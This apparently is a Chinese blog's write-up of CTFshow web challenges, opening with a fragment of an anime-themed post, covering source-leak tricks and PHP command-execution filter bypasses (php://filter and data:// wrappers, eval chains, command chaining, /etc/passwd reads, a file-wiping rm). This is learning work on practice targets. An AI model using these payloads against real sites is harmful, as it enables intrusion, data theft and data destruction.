<p>这一年还入坑了二次元… 二次元给我带来了好多好多美好的东西啊<br>从JoJo6开始到京吹 点兔 安岛… 太多美好回忆了~<br>在这里立个flag: 大三暑假(maybe)去日本好好逛逛 宇治市 大吉山 京阿尼 芳文社…<br>期待明年四月的京吹！</p>
<p>Kitauji Fightooooo!</p>
]]></content>
  </entry>
  <entry>
    <title>web-CTFshow</title>
    <url>/2023/12/04/web-CTFshow/</url>
    <content><![CDATA[<p>记载CTFshow上的web题目(少数能复现 大多都只能看WP&#x2F;视频 来积累思路)</p>
<span id="more"></span>
<p><strong>感谢@L1Nk8ug师傅借我号 终于可以复现了~</strong><br><a href="https://l-i-n-g-c-e-n-g.github.io/" target="_blank">友链</a></p>
<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>VIP题目限免呐~</p>
<h2 id="web1-源码泄露"><a href="#web1-源码泄露" class="headerlink" title="web1 源码泄露"></a>web1 源码泄露</h2><p>bp抓包可以直接在response的源码看到flag</p>
<h2 id="web2-前台JS绕过"><a href="#web2-前台JS绕过" class="headerlink" title="web2 前台JS绕过"></a>web2 前台JS绕过</h2><p>az 直接ctrl+u就看到flag了<br>查看源码发现确实就是js前端作了全部return false的处理 但丝毫不影响 禁用js等操作都可以绕过</p>
<h2 id="web3-协议头信息泄露"><a href="#web3-协议头信息泄露" class="headerlink" title="web3 协议头信息泄露"></a>web3 协议头信息泄露</h2><p>bp抓包 然后在response看到Flag:一栏信息即为flag</p>
<h2 id="web4-robots后台泄露"><a href="#web4-robots后台泄露" class="headerlink" title="web4 robots后台泄露"></a>web4 robots后台泄露</h2><p>一些常见的备份文件(仅限于懒得用dirsearch…)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.index.php.swp</span><br><span class="line">index.php.swp</span><br><span class="line">index.php.bak</span><br><span class="line">.index.php~</span><br><span class="line">index.php.bak_Edietplus</span><br><span class="line">index.php.~</span><br><span class="line">index.php<span class="number">.1</span></span><br><span class="line">index.php</span><br><span class="line">index.php~</span><br><span class="line">index.php.rar</span><br><span class="line">index.php.zip</span><br><span class="line">index.php<span class="number">.7</span>z</span><br><span class="line">index.php.tar.gz</span><br><span class="line">www.zip</span><br><span class="line">www.rar</span><br><span class="line">www.zip</span><br><span class="line">www<span class="number">.7</span>z</span><br><span class="line">www.tar.gz</span><br><span class="line">www.tar</span><br><span class="line">web.zip</span><br><span class="line">web.rar</span><br><span class="line">web.zip</span><br><span class="line">web<span class="number">.7</span>z</span><br><span class="line">web.tar.gz</span><br><span class="line">web.tar</span><br><span class="line">wwwroot.rar</span><br><span class="line">web.rar</span><br><span class="line">robots.txt</span><br><span class="line">index.phps</span><br></pre></td></tr></table></figure>
<p>结合题目提示 访问 &#x2F;robots.txt 得到flag的路径&#x2F;flagishere.txt 访问即可</p>
<h2 id="web5-phps源码泄露"><a href="#web5-phps源码泄露" class="headerlink" title="web5 phps源码泄露"></a>web5 phps源码泄露</h2><p>phps源码 &#x2F;index.phps<br>平时一般猜&#x2F;index.php 这里告诉我们有新的一种.phps<br>访问下载文件 里面即有flag</p>
<h2 id="web6-源码压缩包泄露"><a href="#web6-源码压缩包泄露" class="headerlink" title="web6 源码压缩包泄露"></a>web6 源码压缩包泄露</h2><p>常见的 &#x2F;<a href="http://www.zip/">www.zip</a><br>下载后得到fl000g.txt<br>猜想这是flag路径 访问 &#x2F;fl000g.txt 得到flag</p>
<h2 id="web7-版本控制泄露源码"><a href="#web7-版本控制泄露源码" class="headerlink" title="web7 版本控制泄露源码"></a>web7 版本控制泄露源码</h2><p>.git泄露(所以平时用git要小心啊!!!)<br>访问 &#x2F;.git 得到flag</p>
<h2 id="web8-版本控制泄露源码2"><a href="#web8-版本控制泄露源码2" class="headerlink" title="web8 版本控制泄露源码2"></a>web8 版本控制泄露源码2</h2><p>又学习到了新姿势<br>.svn泄露<br>访问 &#x2F;.svn 得到flag<br>注: SVN是一个开放源代码的版本控制系统(可实现多人协同开发 &amp; …)</p>
<h2 id="web9-vim临时文件泄露"><a href="#web9-vim临时文件泄露" class="headerlink" title="web9 vim临时文件泄露"></a>web9 vim临时文件泄露</h2><p>index.php.swp 泄露<br>vim中的swp即swap 交换分区 在编辑vim时用来备份缓冲区内容</p>
<h2 id="web10-cookie泄露"><a href="#web10-cookie泄露" class="headerlink" title="web10 cookie泄露"></a>web10 cookie泄露</h2><p>bp抓包 在request中的cookie栏得到flag(只是 ‘{‘和’}’被url编码了)</p>
<h2 id="web11-域名txt记录泄露"><a href="#web11-域名txt记录泄露" class="headerlink" title="web11 域名txt记录泄露"></a>web11 域名txt记录泄露</h2><p>题目提示: 域名其实也可以隐藏信息，比如flag.ctfshow.com就隐藏了一条信息<br>这里学习到利用DNS查询<br><a href="http://www.jsons.cn/nslookup/" target="_blank">在线网站</a>查询即可得到flag</p>
<h2 id="web12-敏感信息公布"><a href="#web12-敏感信息公布" class="headerlink" title="web12 敏感信息公布"></a>web12 敏感信息公布</h2><p>哇 很有趣的题~<br>利用题目提示 在下面heapline找到 372619038 猜测这是密码<br>但是找了半天找不到哪里用得上<br>看提示 说返回 &#x2F;admin ! 学到了 然后以 admin 372619038 登录即可得到flag~</p>
<h2 id="web13-内部技术文档泄露"><a href="#web13-内部技术文档泄露" class="headerlink" title="web13 内部技术文档泄露"></a>web13 内部技术文档泄露</h2><p>这 属实想不到 orz<br>Home最下面会发现document可以点！ 然后就能下载得到pdf…<br>里面<del>贴心的</del>记录了登录路径&#x2F;用户名&#x2F;密码…<br>跟着访问即可得到flag</p>
<h2 id="web14-编辑器配置不当"><a href="#web14-编辑器配置不当" class="headerlink" title="web14 编辑器配置不当"></a>web14 编辑器配置不当</h2><p>az 访问 &#x2F;editor (…)<br>进入里面 找到图片上传 发现可以访问文件空间 能看到网站的所有信息<br>然后在 &#x2F;var&#x2F;www&#x2F;nothinghere下找到flag地址 访问&#x2F;nothinghere&#x2F;flag…txt即可<br>&#x2F;var&#x2F;www下放置的是站点配置 所以用后面地址才能访问</p>
<h2 id="web15-密码逻辑脆弱"><a href="#web15-密码逻辑脆弱" class="headerlink" title="web15 密码逻辑脆弱"></a>web15 密码逻辑脆弱</h2><p>网站最下面泄露邮箱咯 <a href="mailto:&#49;&#49;&#53;&#54;&#54;&#x33;&#49;&#57;&#x36;&#49;&#64;&#x71;&#113;&#x2e;&#x63;&#x6f;&#x6d;">&#49;&#49;&#53;&#54;&#54;&#x33;&#49;&#57;&#x36;&#49;&#64;&#x71;&#113;&#x2e;&#x63;&#x6f;&#x6d;</a> (敲响警钟！ 自己网站也要注意！)<br>访问 &#x2F;admin 密码尝试 1156631961发现不对劲 怎么都登不进去<br>又学到骚操作了 忘记密码 密保是城市 那么利用QQ号搜索！！！<br>在西安 就行了 orz<br>密码被重置为 admin7789</p>
<h2 id="web16-探针泄露"><a href="#web16-探针泄露" class="headerlink" title="web16 探针泄露"></a>web16 探针泄露</h2><p>你别说这网站还挺炫的 orz<br>?? 什么是探针??? </p>
<p><a href="https://xz.aliyun.com/t/2222#:~:text=%E7%BD%91%E7%AB%99%E6%8E%A2%E9%92%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%8F%AF,%E5%9C%A8%E5%90%84%E6%96%B0%E5%BB%BA%E7%BD%91%E7%AB%99%E4%B8%8A%E3%80%82">https://xz.aliyun.com/t/2222#:~:text=%E7%BD%91%E7%AB%99%E6%8E%A2%E9%92%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%8F%AF,%E5%9C%A8%E5%90%84%E6%96%B0%E5%BB%BA%E7%BD%91%E7%AB%99%E4%B8%8A%E3%80%82</a></p>
<p>但是这道题 访问 &#x2F;tz.php<br>发现phpinfo()可以点击查看(也符合上面链接的介绍)<br>搜索flag即得</p>
<h2 id="web17-CDN穿透"><a href="#web17-CDN穿透" class="headerlink" title="web17 CDN穿透"></a>web17 CDN穿透</h2><p>透过重重缓存，查找到ctfer.com的真实IP<br><a href="https://www.cnblogs.com/qiudabai/p/9763739.html">https://www.cnblogs.com/qiudabai/p/9763739.html</a><br>这里直接ping即可 (做题归做题 还是要多学点相关知识)<br>但是貌似现在的ip变了… 比如我Ping&#x2F;查询 都得到的是 124.222.110.176 …</p>
<h2 id="web18-js敏感信息泄露"><a href="#web18-js敏感信息泄露" class="headerlink" title="web18 js敏感信息泄露"></a>web18 js敏感信息泄露</h2><p>一个小游戏界面 查看源码 发现score&gt;101会弹出 <code>\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b</code><br>解码: 你赢了，去幺幺零点皮爱吃皮看看<br>屮 皮爱吃皮是’php’的意思 … (想想也是 通关后肯定弹出一个php界面~)<br>行吧 访问 110.php即可</p>
<h2 id="web19-前端密钥泄露"><a href="#web19-前端密钥泄露" class="headerlink" title="web19 前端密钥泄露"></a>web19 前端密钥泄露</h2><p>一个登录界面 前端源码一看 everthing is here…<br>给了CBC加密的IV KEY 和最后的passwd加密值 直接decrypt即可(写的时候又把参数位置写反了… key MODE iv)<br>passwd : i_want_a_36d_girl</p>
<h2 id="web20-数据库恶意下载"><a href="#web20-数据库恶意下载" class="headerlink" title="web20 数据库恶意下载"></a>web20 数据库恶意下载</h2><p>题目提示 : mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了<br>早期的asp+access是.mdb形式 访问 &#x2F;db&#x2F;db.mdb(这db咋想到的啊 orz)<br>下载得到数据库 🔍即可找到flag</p>
<hr>
<hr>
<p>总结: 这些细枝末节的考点有时候真的会成为关键！ 当源码找不到思路 尝试许久无果时 试试找泄露！</p>
<h1 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h1><p>这部分没环境爆个鬼🤣</p>
<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><p>只过滤了 flag 所以可以用?,* 来匹配<br>视频有个很秀的做法 <code>system(&quot;cp flag.php 1.txt&quot;)</code> 然后直接访问 &#x2F;1.txt !</p>
<h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><p>过滤了 flag system php<br>用上面的方法</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">`cp fla?.??? 1.txt`</span><br></pre></td></tr></table></figure>
<p>然后访问 &#x2F;1.txt</p>
<h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><p>过滤了 flag system php cat sort shell 点 空格 单引号<br>视频这样执行:  <code>/?c=eval($_GET[1]);&amp;1=phpinfo();</code> 注意phpinfo()结尾分号!<br>这里是参数逃逸(跳板) 学到了 orz<br>这样的话 &amp;1&#x3D;后面就可以传任意值了(脱离了参数c的约束 所以不会被匹配到)<br>这样 <code>cat flag.php</code>需要在源代码中查看<br>而视频又给了一种做法 <code>tac flag.php</code> cat反过来写 就可以直接看到了</p>
<h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><p>过滤了 flag system php cat sort shell 点 空格 单引号 反引号 分号 括号<br>首先还是可以用上一题的方法 <code>/?c=eval($_GET[1]);&amp;1=phpinfo();</code><br>空格被过滤了可以用url编码(空格 换行 都可以)<br>还有一个点 这里分号被过滤了 可以用 ?&gt;形式  (php最后一条语句不需要分号)<br>视频采用了include<br><code>/?c=include%0a$_GET[1]?&gt;&amp;1=/etc/passwd</code><br>&#x2F;etc&#x2F;passwd 也是一个常见的点 可以得到一些基本信息<br>甚至还可以包括 &#x2F;bin&#x2F;ls 二进制文件 orz<br>接下来的获取flag 视频采用的是文件包含的形式 (因为我们这里用的include 无法直接输出)<br><code>/...?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code></p>
<h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><p>过滤了 flag system php cat sort shell 点 空格 单引号 echo 反引号 分号 括号 双引号<br>继续学习新姿势 用require<br><code>/?c=require%0a$_GET[1]?&gt;&amp;1=/etc/passwd</code><br>所以&amp;1&#x3D;后面接伪协议即可读取flag</p>
<h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><p>过滤了 flag system php cat sort shell 点 空格 单引号 echo 反引号 分号 括号 双引号 冒号<br>多过滤了一个冒号 我寻思上题思路也能继续用吧<br>payload : <code>/?c=include%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code></p>
<p>这里视频总结了一下不需要使用括号的情况(语言结构) 常用:</p>
<ul>
<li>echo</li>
<li>print</li>
<li>isset</li>
<li>unset</li>
<li>include</li>
<li>require</li>
</ul>
<p>这也是为什么过滤了括号我们的include仍然可以用(前面用%0a隔开)<br>虽说print也能执行 但是打印出来的不是数据而是flag.php名称…</p>
<h2 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h2><p>过滤了 flag system php cat sort shell 点 空格 单引号 echo 反引号 分号 括号 双引号 冒号 &lt; &#x3D;<br>多过滤了 &lt; &#x3D;<br>az 由于我们用跳板把c的影响去掉了 所以只要在 &amp;1&#x3D; 前面不出现这些就行了 后面还是随意填<br><code>/?c=include%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code></p>
<h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h2><p>过滤了 flag system php cat sort shell 点 空格 单引号 echo 反引号 分号 括号 双引号 冒号 &lt; &#x3D; &#x2F; [0-9]<br>多过滤了 &#x2F; 和 0~9数字<br>只需要把GET[1]改为GET[a]即可<br><code>/?c=include%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code><br>这里视频也说明了为什么我们GET里面的1,a都可以不加引号: php为了向下兼容保留了这种写法(🙇‍)</p>
<h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h2><p>另一种形式:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>
<p>尝试传入 <code>/?c=$_GET[1]?&gt;&amp;1=flag.php</code>发现不能得到flag<br>这是因为这样做只能include flag.php这个字符串 而不能解析flag.php中的数据内容<br>这里视频给了一种用data伪协议的做法<br>data伪协议用法:<br><code>data://text/plain,xxx</code><br>会把xxx字符串作为命令执行<br>比如 <code>data://text/plain,&lt;?php phpinfo(); ?&gt;</code><br>那么我们就可以利用shell中的?匹配来绕过flag的过滤<br>姿势很多 视频又用了cp 😄<br><code>/?c=data://text/plain,&lt;?php system(&quot;mv fla?.php 1.txt&quot;); ?&gt;</code> 这样以后访问 &#x2F;1.txt即可<br>但有个疑问 为什么我第一次mv 操作后后面不管用mv 还是cp都无法继续操作了?<br>再次复现发现确实mv了过后原来的flag.php就没了 再cp就无效了<br>然后发现 <code>rm *.*</code> 能删掉所有😄</p>
<h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><p>过滤了 flag php file<br>这里过滤了php就不能像上面那样 <?php xxx ?>了<br>看视频说把<?php >改为 <?= >就行了(短标签)
一试还真行 orz
这样就可以用system来执行了
`/?c=data://text/plain,<?= system("tac fla?.???"); ?><code>当然也可以这种方式:</code>&#x2F;?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?= system("cp fl*.* 22.txt"); ?>&#96;(这么一看*通配符比?好用点 orz)</p>
<hr>
<hr>
<p>所以再看看37,38发现并没有用到第二行的 <code>echo $flag</code> 都是直接利用include+data伪协议直接命令执行了</p>
<h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><p>又是一种新形式：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我的第一思路还是采取data伪协议来命令执行 最后加的.php后缀利用%20截断即可<br><code>/?c=data://text/plain,&lt;?= system(&quot;tac *.*&quot;) ?&gt;%20</code><br>然后看视频好像不截断也不会影响前面的代码执行 只是会加上一行回显 xxx.php罢了(xxx是前面命令执行的返回值)</p>
<h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><p>过滤了好多 </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里剩下了字母 分号 下划线等(其实题目过滤的是中文括号！！！)<br>emmm 完全不会~ 学习一下<br>看hint:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>()))))); GXYCTF的禁止套娃 通过cookie获得参数进行命令执行</span><br><span class="line"></span><br><span class="line">c=<span class="title function_ invoke__">session_start</span>();<span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">session_id</span>());</span><br><span class="line">passid=ls</span><br></pre></td></tr></table></figure>
<h3 id="solution1"><a href="#solution1" class="headerlink" title="solution1"></a>solution1</h3><p>payload: <code>/?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</code> 可以得到flag<br>或者 <code>/?c=show_source(next(array_reverse(scandir(getcwd()))));</code><br>当然这里也可以把 <code>show_source</code> 改为 <code>echo highlight_file</code> (这时回显是flag后跟了一个1)<br>orz tql 先放这</p>
<ul>
<li>getcwd() 函数返回当前工作目录。它可以代替pos(localeconv())</li>
<li>localeconv()：返回包含本地化数字和货币格式信息的关联数组。这里主要是返回值为数组且第一项为”.”</li>
<li>pos():输出数组第一个元素，不改变指针；</li>
<li>current() 函数返回数组中的当前元素（单元）,默认取第一个值，和pos()一样</li>
<li>scandir() 函数返回指定目录中的文件和目录的数组。这里因为参数为”.”所以遍历当前目录</li>
<li>array_reverse():数组逆置</li>
<li>next():将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[2]取出数组也可以</li>
<li>show_source():查看源码</li>
<li>pos() 函数返回数组中的当前元素的值。该函数是current()函数的别名。每个数组中都有一个内部的指针指向它的”当前”元素，初始指向插入到数组中的第一个元素。提示：该函数不会移动数组内部指针。</li>
</ul>
<h3 id="solution2"><a href="#solution2" class="headerlink" title="solution2"></a><del>solution2</del></h3><p>题目提示还给了一种方法<br>先传payload:  <code>/?c=session_start();system(session_id());</code><br>然后找到PHPSESSID 将值修改为 ls(bp抓包修改也行) 就可以执行 system(“ls”)! orz 太秀了吧…<br>但是呢 这样拿不到flag.php的值 这样改了传过后PHPSESSID也变了(但这种也是一个很有趣额思路)</p>
<h3 id="solution3"><a href="#solution3" class="headerlink" title="solution3"></a>solution3</h3><p>视频给了另外的方法<br>也学习到了很多新东西</p>
<ul>
<li>get_defined_vars() 返回一个包含所有已定义变量的多维数组。这些变量包括环境变量、服务器变量和用户定义的变量，例如GET、POST、FILE等等。</li>
<li>next()将内部指针指向数组中的下一个元素，并输出。</li>
<li>array_pop() 函数删除数组中的最后一个元素并返回其值。</li>
</ul>
<p>传入 <code>/?c=print_r(get_defined_vars());</code> 来打印所有变量<br>这里我们再POST一个a&#x3D;phpinfo();<br>通过  <code>next(get_defined_vars())</code> 可以得到 <code>Array ( [a] =&gt; phpinfo(); ) </code><br>拿到这个数组后 利用array_pop可以弹出数组中的内容 也就是我们需要的phpinfo();<br><code>array_pop(next(get_defined_vars()))</code><br>所以构造payload <code>/?c=eval(array_pop(next(get_defined_vars())));</code> 即可执行<br>接下来只需要把 POST的值改一改就能RCE了<br>注意POST传的值结尾要有分号！</p>
<h3 id="solution4"><a href="#solution4" class="headerlink" title="solution4"></a>solution4</h3><p><code>?c=eval(next(reset(get_defined_vars())));&amp;1=;system(&quot;tac%20flag.php&quot;);</code><br>跟读取post参数类似，直接读get参数然后分离出来执行<br>这里实测发现其实是先用reset将传入c之前的所有变量清空 再传入c作为第一个变量 而后传入的1变量是第二个<br>那么用next指向第二个(也就是c1)就能执行了(print_r打印可以发现直接就是<code>system(&quot;tac flag.php&quot;);</code>字符串所以不需要取数组元素操作)</p>
<h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意到这里后面跟的是 <code>/i</code> 所以大小写字母都被过滤了<br>这… 貌似是无数字字母RCE 以前没学过 现在正好学一学<br>题目给了个<a href="https://blog.csdn.net/miuzzx/article/details/108569080" target="_blank">hint</a><br>那就跟着学一学吧<br>题目留了个 or 运算符 也就是我们可以通过 <code>%40 | %01</code> 来构造A(提交后会自动url解码)<br>注意到我们构造出来的字符串是不能直接执行的<br>利用php特性:<br>phpinfo();    &lt;&#x3D;&gt;   (‘phpinfo’)();<br>下面看看如何构造system<br>单个字母构造 : <code>(&#39;%40&#39;|&#39;%13&#39;)</code> 那么多个字母如何拼接呢? 利用php的 “.” 运算符可以实现<br>所以 system(“ls”): <code>((&#39;%40&#39;|&#39;%13&#39;).(&#39;%40&#39;|&#39;%19&#39;).(&#39;%40&#39;|&#39;%13&#39;).(&#39;%40&#39;|&#39;%14&#39;).(&#39;%40&#39;|&#39;%05&#39;).(&#39;%60&#39;|&#39;%0d&#39;))(((&#39;%40&#39;|&#39;%0c&#39;).(&#39;%40&#39;|&#39;%13&#39;)))</code><br>但是这样还是不可执行 因为我们构造的里面有 <code>%0d</code> 这个是换行符…<br>执行会出现</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">system</span><br><span class="line">(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure>
<p>这种情况<br>所以最好还是要用题目给的两个脚本来跑 过几天再来看 (php本地环境没装)</p>
<hr>
<hr>
<p>总之这道题展示了一种技巧 像其他的比如 取反 xor 来构造都大同小异</p>
<h2 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从没见过的东西…  orz<br>看视频的大致意思 就是不管怎么执行$cxxx 所有返回结果都不显示<br>又学到了一个姿势:<br>构造payload:  <code>/?c=ls;ls</code> 这样就能得到回显<br>因为我们相当于传了两条命令 后面的ls被写入黑洞中了 但是分号前面的这条命令会正常执行! orz<br>这样就可以直接RCE了</p>
<h2 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>加了一小点过滤 过滤了 \ 分号 | cat<br>过滤了分号就不能直接用上题的方式了<br>学习到了 and: &amp;&amp; (上一题我还试过 只是写成单&amp;了…<del>G</del>)<br>&amp;&amp; 连接代表第一个命令执行成功后才执行第二个<br>但是直接 <code>ls&amp;&amp;ls</code> 还是没回显<br>看视频说要将 &amp; url编码 %26 (为什么呢?)<br>因为我们直接传 <code>/?c=ls&amp;&amp;ls</code> 会被解析成我传了 c&#x3D;ls 和一个 &amp;ls<br>我们想要的命令结构就被破坏掉了 所以url上编码隐藏一层 提交后自动url解码就是我们想要的命令形式了</p>
<p>尝试 || 不编码即可执行</p>
<hr>
<hr>
<p>web orz</p>
<h2 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h2><p>az<br>一样的用 &amp;&amp;来绕就行了<br><code>/?c=tac%20fla*.*||ls</code></p>
<h2 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h2><p>多过滤了空格<br>尝试%20发现也被过滤<br>但是我们还可以用 %09(水平制表符)<br><code>/?c=tac%09fla*.*||ls</code></p>
<h2 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>
<p>这里虽然过滤了0-9 但是我们url编码的%09解码后不是数字<br>在我们提交和最后preg_match中间经历了一层url解码<br><code>/?c=ta\c%09fla?.???||ls</code> 即可</p>
<h2 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>还是直接 <code>/?c=tac%09fla?.ph?||ls</code> 即可绕过</p>
